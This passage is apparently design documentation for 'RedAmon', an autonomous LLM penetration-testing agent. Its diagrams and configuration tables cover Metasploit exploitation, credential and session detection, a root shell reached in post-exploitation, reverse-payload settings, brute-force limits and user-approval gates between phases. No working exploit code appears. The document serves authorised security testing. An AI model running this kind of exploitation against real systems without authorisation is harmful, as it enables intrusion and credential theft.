    MSF-->>A: Credential found + session created

    Note over A: Credentials + session detected via inline output analysis

    A->>A: Request phase transition to post_exploitation
    U->>A: Approve transition

    Note over A: Phase: Post-Exploitation (Shell session)
    A->>MSF: msf_session_run(1, "whoami")
    MSF->>T: Execute command via SSH session
    T-->>MSF: "root"
    MSF-->>A: Command output
```

### Q&A Interaction Flow

```mermaid
sequenceDiagram
    participant A as Agent (Think Node)
    participant O as Orchestrator
    participant WS as WebSocket
    participant U as User (Frontend)

    A->>O: Decision: ask_user with question
    O->>O: Store pending_question
    O->>O: Set awaiting_user_question = true
    O->>WS: Send question_request message

    WS->>U: Display question dialog
    Note over U: Dialog shows question, context, format<br/>(text/single_choice/multi_choice)

    Note over O,U: Graph pauses at await_question node (END)

    U->>WS: User provides answer
    WS->>O: Resume with user_question_answer

    O->>O: Create QAHistoryEntry
    O->>O: Add to qa_history
    O->>O: Clear question state
    O->>O: Add answer to messages context

    O->>A: Continue with answer in context

    Note over A: Agent can reference qa_history<br/>in future decisions
```

### Multi-Objective Session Flow

```mermaid
flowchart TB
    subgraph Objective1["Objective #1: Port scan"]
        O1_START[User: "Scan ports on 192.168.1.1"]
        O1_WORK[Agent executes naabu scan]
        O1_DONE[Objective completed]
    end

    subgraph Objective2["Objective #2: Vulnerability scan"]
        O2_START[User: "Check for CVEs"]
        O2_DETECT[Detect new message after completion]
        O2_CREATE[Create new ConversationObjective]
        O2_WORK[Agent queries graph + analyzes]
        O2_DONE[Objective completed]
    end

    subgraph Objective3["Objective #3: Exploit"]
        O3_START[User: "Exploit CVE-2021-41773"]
        O3_PHASE[Phase transition to exploitation]
        O3_WORK[Agent runs Metasploit]
        O3_DONE[Objective completed]
    end

    subgraph State["Persistent State"]
        TRACE[execution_trace: All steps preserved]
        TARGET[target_info: Accumulates across objectives]
        HISTORY[objective_history: Completed objectives]
        QA[qa_history: All Q&A preserved]
    end

    O1_START --> O1_WORK --> O1_DONE
    O1_DONE --> O2_START
    O2_START --> O2_DETECT --> O2_CREATE --> O2_WORK --> O2_DONE
    O2_DONE --> O3_START
    O3_START --> O3_PHASE --> O3_WORK --> O3_DONE

    O1_DONE -.-> |Archive| HISTORY
    O2_DONE -.-> |Archive| HISTORY
    O3_DONE -.-> |Archive| HISTORY

    O1_WORK -.-> TRACE
    O2_WORK -.-> TRACE
    O3_WORK -.-> TRACE

    O1_WORK -.-> TARGET
    O2_WORK -.-> TARGET
    O3_WORK -.-> TARGET

    style Objective1 fill:#90EE90
    style Objective2 fill:#87CEEB
    style Objective3 fill:#FFD700
```

---

## Multi-Objective Support

The system handles continuous conversations where users ask multiple sequential questions:

```mermaid
flowchart LR
    subgraph Detection["New Objective Detection"]
        MSG[New user message arrives]
        CHECK{task_complete<br/>from previous?}
        DIFF{Message differs<br/>from current objective?}
        CREATE[Create new ConversationObjective]
    end

    subgraph Archive["Objective Archival"]
        COMPLETE[Current objective completed]
        OUTCOME[Create ObjectiveOutcome]
        STORE[Add to objective_history]
        PRESERVE[Preserve execution_trace,<br/>target_info, qa_history]
    end

    subgraph Phase["Phase Management"]
        INFER[LLM classifies attack path<br/>+ required_phase]
        DOWN{Downgrade to<br/>informational?}
        AUTO[Auto-transition<br/>no approval needed]
        UP{Upgrade to<br/>exploitation?}
        APPROVAL[Require user approval]
    end

    MSG --> CHECK
    CHECK -->|Yes| CREATE
    CHECK -->|No| DIFF
    DIFF -->|Yes| CREATE

    COMPLETE --> OUTCOME --> STORE --> PRESERVE

    CREATE --> INFER
    INFER --> DOWN
    DOWN -->|Yes| AUTO
    DOWN -->|No| UP
    UP -->|Yes| APPROVAL
```

### Objective State Fields

| Field | Purpose |
|-------|---------|
| `conversation_objectives` | List of all objectives (current + future) |
| `current_objective_index` | Which objective is being worked on |
| `objective_history` | Completed objectives with their outcomes |
| `original_objective` | Backward compatibility with single-objective sessions |

---

## Security & Multi-Tenancy

### Tenant Isolation

```mermaid
flowchart TB
    subgraph Request["Incoming Request"]
        USER[user_id: "user123"]
        PROJ[project_id: "proj456"]
        SESS[session_id: "sess789"]
    end

    subgraph Context["Context Injection"]
        SET_CTX[set_tenant_context<br/>set_phase_context]
        THREAD[Thread-local variables]
    end

    subgraph Neo4j["Neo4j Query Filtering"]
        QUERY[LLM generates Cypher]
        INJECT[Inject tenant filter]
        FILTERED["WHERE n.user_id = 'user123'<br/>AND n.project_id = 'proj456'"]
    end

    subgraph Checkpoint["Session Checkpointing"]
        CONFIG[LangGraph config with thread_id]
        MEMORY[MemorySaver stores state]
        RESUME[Resume from exact state]
    end

    USER --> SET_CTX
    PROJ --> SET_CTX
    SESS --> CONFIG

    SET_CTX --> THREAD
    THREAD --> INJECT
    QUERY --> INJECT --> FILTERED

    CONFIG --> MEMORY
    MEMORY --> RESUME
```

### Phase-Based Access Control

```mermaid
flowchart TB
    subgraph Params["Configuration (project_settings.py)"]
        REQ_EXPL[REQUIRE_APPROVAL_FOR_EXPLOITATION]
        REQ_POST[REQUIRE_APPROVAL_FOR_POST_EXPLOITATION]
        ACT_POST[ACTIVATE_POST_EXPL_PHASE]
        POST_TYPE[POST_EXPL_PHASE_TYPE]
    end

    subgraph Validation["Tool Execution Validation"]
        CHECK_PHASE{Tool allowed<br/>in current phase?}
        ALLOW[Execute tool]
        DENY[Return error:<br/>"Tool not available in phase"]
    end

    subgraph Transition["Phase Transition"]
        TO_INFO[To informational]
        TO_EXPL[To exploitation]
        TO_POST[To post_exploitation]
        AUTO_OK[Auto-approve<br/>safe downgrade]
        NEED_APPROVAL[Require user approval]
        BLOCKED[Block if disabled]
    end

    CHECK_PHASE -->|Yes| ALLOW
    CHECK_PHASE -->|No| DENY

    TO_INFO --> AUTO_OK
    TO_EXPL --> |REQ_EXPL=true| NEED_APPROVAL
    TO_EXPL --> |REQ_EXPL=false| AUTO_OK
    TO_POST --> |ACT_POST=false| BLOCKED
    TO_POST --> |REQ_POST=true| NEED_APPROVAL
    TO_POST --> |REQ_POST=false| AUTO_OK
```

---

## Error Handling & Resilience

### LLM Response Parsing

```mermaid
flowchart TB
    RESPONSE[LLM Response Text]

    EXTRACT[Extract JSON from response]
    EXTRACT --> PARSE{Parse JSON?}

    PARSE -->|Success| VALIDATE[Pydantic validation]
    PARSE -->|Fail| FALLBACK_JSON[Try extract partial fields]

    VALIDATE -->|Success| DECISION[LLMDecision object]
    VALIDATE -->|Fail| PREPROCESS[Preprocess: remove empty objects<br/>user_question, phase_transition, output_analysis]

    PREPROCESS --> VALIDATE2[Retry validation]
    VALIDATE2 -->|Success| DECISION
    VALIDATE2 -->|Fail| FALLBACK_DECISION[Fallback LLMDecision<br/>action=complete with error]

    FALLBACK_JSON --> FALLBACK_ANALYSIS[Fallback: raw tool output<br/>used as interpretation]
```

### Metasploit Output Cleaning

```mermaid
flowchart LR
    RAW[Raw msfconsole output]

    ANSI[Remove ANSI escape sequences]
    CR[Handle carriage returns]
    CTRL[Remove control characters]
    ECHO[Filter garbled echo lines]
    TIMING[Timing-based output detection<br/>Wait for quiet period]

    RAW --> ANSI --> CR --> CTRL --> ECHO --> TIMING --> CLEAN[Clean output]
```

### Neo4j Query Retry

```mermaid
flowchart TB
    QUESTION[Natural language question]

    GEN[LLM generates Cypher]
    EXEC[Execute query]

    EXEC --> CHECK{Success?}
    CHECK -->|Yes| RESULT[Return results]
    CHECK -->|No| RETRY_CHECK{Retries < MAX?}

    RETRY_CHECK -->|Yes| CONTEXT[Add error context to prompt]
    RETRY_CHECK -->|No| ERROR[Return error message]

    CONTEXT --> GEN
```

---

## Configuration Reference

### Settings Source: `project_settings.py`

Configuration is now **database-driven**. When `PROJECT_ID` and `WEBAPP_API_URL` environment variables are set, settings are fetched from PostgreSQL via the webapp API. Otherwise, `DEFAULT_AGENT_SETTINGS` provides fallback values for standalone usage.

```mermaid
flowchart LR
    DB[(PostgreSQL)] --> API[Webapp API<br/>/api/projects/:id]
    API --> PS[project_settings.py<br/>get_setting]
    PS --> ORCH[Orchestrator]
    PS --> PROMPTS[Prompts]
    PS --> TOOLS[Tools]

    DEFAULTS[DEFAULT_AGENT_SETTINGS] -.->|fallback| PS
```

### Key Parameters

| Parameter | Default | Description |
|-----------|---------|-------------|
| `OPENAI_MODEL` | `"gpt-5.2"` | LLM model for reasoning |
| `MAX_ITERATIONS` | `100` | Maximum ReAct loop iterations |
| `EXECUTION_TRACE_MEMORY_STEPS` | `100` | How many steps to include in LLM context |
| `TOOL_OUTPUT_MAX_CHARS` | `8000` | Truncate tool output for LLM analysis |
| `REQUIRE_APPROVAL_FOR_EXPLOITATION` | `true` | Require user approval for exploitation phase |
| `REQUIRE_APPROVAL_FOR_POST_EXPLOITATION` | `true` | Require user approval for post-exploitation |
| `ACTIVATE_POST_EXPL_PHASE` | `true` | Enable post-exploitation phase |
| `POST_EXPL_PHASE_TYPE` | `"statefull"` | `"stateless"` or `"statefull"` session mode |
| `LHOST` | `""` | Attacker IP for reverse payloads (empty = bind mode) |
| `LPORT` | `null` | Attacker port for reverse payloads |
| `BIND_PORT_ON_TARGET` | `4444` | Port opened on target for bind payloads |
| `PAYLOAD_USE_HTTPS` | `false` | Use HTTPS for staged payloads |
| `BRUTE_FORCE_MAX_WORDLIST_ATTEMPTS` | `3` | Max wordlist iterations for brute force |
| `INFORMATIONAL_SYSTEM_PROMPT` | `""` | Custom system prompt injected during informational phase |
| `EXPL_SYSTEM_PROMPT` | `""` | Custom system prompt injected during exploitation phase |
| `POST_EXPL_SYSTEM_PROMPT` | `""` | Custom system prompt injected during post-exploitation phase |
| `CYPHER_MAX_RETRIES` | `3` | Neo4j text-to-Cypher retry limit |
| `CREATE_GRAPH_IMAGE_ON_INIT` | `false` | Export LangGraph structure as PNG on startup |

### Environment Variables

| Variable | Required | Description |
|----------|----------|-------------|
| `OPENAI_API_KEY` | Yes | OpenAI API key for LLM calls |
| `NEO4J_URI` | Yes | Neo4j connection URI |
| `NEO4J_USER` | Yes | Neo4j username |
| `NEO4J_PASSWORD` | Yes | Neo4j password |
| `PROJECT_ID` | For DB settings | Project ID to fetch settings for |
| `WEBAPP_API_URL` | For DB settings | Webapp base URL (e.g., `http://localhost:3000`) |

---

## Running the System

### Start MCP Servers

```bash
cd mcp/
docker-compose up -d
```

### Start Agentic API

```bash
cd agentic/
docker-compose up -d
# Or for development:
uvicorn api:app --reload --port 8080
```

### WebSocket Connection

```javascript
const ws = new WebSocket('ws://localhost:8080/ws');

// Authenticate
ws.send(JSON.stringify({
  type: 'init',
  payload: { user_id: 'user123', project_id: 'proj456', session_id: 'sess789' }
}));

// Send query
ws.send(JSON.stringify({
  type: 'query',
  payload: { question: 'Scan ports on 192.168.1.1' }
}));

// Send guidance while agent is working
ws.send(JSON.stringify({
  type: 'guidance',
  payload: { message: 'Focus on port 22 first' }
}));

// Stop agent execution
ws.send(JSON.stringify({ type: 'stop', payload: {} }));

// Resume from last checkpoint
ws.send(JSON.stringify({ type: 'resume', payload: {} }));

// Handle responses
ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  console.log(msg.type, msg.payload);
};
```

---

## Summary

The RedAmon Agentic System provides:

1. **Autonomous Reasoning** - LangGraph-based ReAct pattern for intelligent decision making
2. **Phase-Based Security** - Controlled progression through informational → exploitation → post-exploitation
3. **Attack Path Classification** - LLM-based classification of objectives into CVE exploit or brute force paths, with dynamic tool routing
4. **Human Oversight** - Approval workflows for risky phase transitions and pre-exploitation validation
5. **Real-Time Feedback** - WebSocket streaming with progress chunks for long-running commands
6. **Live Guidance** - Send steering messages while the agent works, injected into the next think step
7. **Stop & Resume** - Interrupt agent execution and resume from the last LangGraph checkpoint
8. **Multi-Tenancy** - Isolated sessions with tenant-filtered data access
9. **Stateful Exploitation** - Persistent Metasploit sessions with auto-reset and session/credential detection
10. **Multi-Objective Support** - Continuous conversations with context preservation and per-objective attack path classification
11. **Database-Driven Configuration** - All settings fetched from PostgreSQL via webapp API, with standalone defaults fallback
12. **Custom Phase Prompts** - Per-phase system prompt injection for project-specific agent behavior
